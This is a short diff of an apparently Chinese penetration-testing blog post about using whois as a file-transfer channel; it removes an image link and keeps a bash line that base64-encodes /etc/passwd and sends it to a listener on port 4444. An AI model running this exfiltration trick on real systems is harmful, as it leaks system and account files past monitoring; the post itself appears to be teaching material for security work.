@@ -9,10 +9,6 @@ keywords: whois 渗透
 
 
 
-
-![](http://112firshme11224.test.upcdn.net/blog/2019-12-20-17-51-54.png!100)
-
-
 ```bash
 传输机：
 root@john:~# whois -h 127.0.0.1 -p 4444 `cat /etc/passwd | base64`
